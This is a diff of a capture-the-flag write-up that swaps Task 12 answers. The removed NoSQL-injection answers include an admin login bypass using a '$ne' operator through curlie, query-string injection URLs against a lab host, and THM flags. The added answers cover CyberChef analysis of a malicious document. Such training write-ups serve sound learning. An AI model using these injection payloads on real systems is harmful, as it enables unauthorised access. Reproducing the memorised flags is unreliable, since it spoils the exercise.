@@ -142,32 +142,25 @@ macro_hunter
 
 ## Task 12
 
-1. Interact with the MongoDB server to find the flag. What is the flag? 
+1. What is the version of CyberChef found in the attached VM?
 ```
-THM{8814a5e6662a9763f7df23ee59d944f9}
+9.49.0
 ```
-2. We discussed how to bypass login pages as an admin. Can you log into the application that Grinch Enterprise controls as admin and retrieve the flag?
-Use the knowledge given in AoC3 day 4 to setup and run Burp Suite proxy to intercept the HTTP request for the login page. Then modify the POST parameter.
-```zsh
-curlie -X POST http://10-10-248-127.p.thmlabs.com/login -d '{"username":"admin","password":{"$ne":"password"}}'
-
+2. How many recipes were used to extract URLs from the malicious doc?
 ```
+10
 ```
-THM{b6b304f5d5834a4d089b570840b467a8}
+3. We found a URL that was downloading a suspicious file; what is the name of that malware?
 ```
-3. Once you are logged in, use the gift search page to list all usernames that have guest roles. What is the flag?
-```zsh
-https://10-10-248-127.p.thmlabs.com/search?username[$ne]=ben&role=guest
+mysterygift.exe
 ```
+4. What is the last defanged URL of the bandityeti domain found in the last step?
 ```
-THM{2ec099f2d602cc4968c5267970be1326}
+hxxps[://]cdn[.]bandityeti[.]THM/files/index/
 ```
-4. Use the gift search page to perform NoSQL injection and retrieve the mcskidy record. What is the details record?
-```zsh
-https://10-10-248-127.p.thmlabs.com/search?username=mcskidy&role[$ne]=guest
+5. What is the ticket found in one of the domains? (Format: Domain/<GOLDEN_FLAG>)
 ```
-```
-ID:6184f516ef6da50433f100f4:mcskidy:admin
+THM_MYSTERY_FLAG
 ```
 
 ## Task 13
